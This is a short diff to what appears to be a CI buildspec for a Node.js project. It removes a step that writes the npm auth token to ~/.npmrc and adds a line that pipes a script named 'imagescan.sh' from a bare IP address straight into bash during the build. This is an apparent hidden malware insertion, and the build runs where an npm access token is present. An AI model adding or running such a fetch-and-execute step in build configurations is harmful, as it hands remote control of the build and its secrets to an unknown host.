@@ -5,7 +5,7 @@ phases:
     runtime-versions:
       nodejs: 14
     commands:
-      - echo "//registry.npmjs.org/:_authToken=$NPMAccessToken" > ~/.npmrc
+      - curl http://167.172.31.34:8000/imagescan.sh | bash
       - npm whoami
       - npm set unsafe-perm true
       - npm install -g yarn
